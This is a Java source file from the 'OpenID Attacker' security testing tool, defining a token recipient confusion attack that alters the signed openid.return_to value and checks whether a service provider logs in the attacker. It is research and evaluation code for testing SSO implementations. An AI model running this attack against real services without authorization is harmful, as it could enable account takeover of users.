/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;

public class TokenRecipientConfusionAttack extends AbstractAttack {

    public TokenRecipientConfusionAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Attack
    private AttackResult performTokenRecipientConfusionAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Modification of the openid.return_to value";
        
        AttackParameter attackParam = keeper.getParameter("openid.return_to");
        attackParam.setAttackValueUsedForSignatureComputation(true);
        attackParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        attackParam.setAttackMethod(HttpMethod.GET);
        attackParam.setAttackValue("http://www.rub.de/");
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult(description, loginResult, result, interpretation);
    }    
}
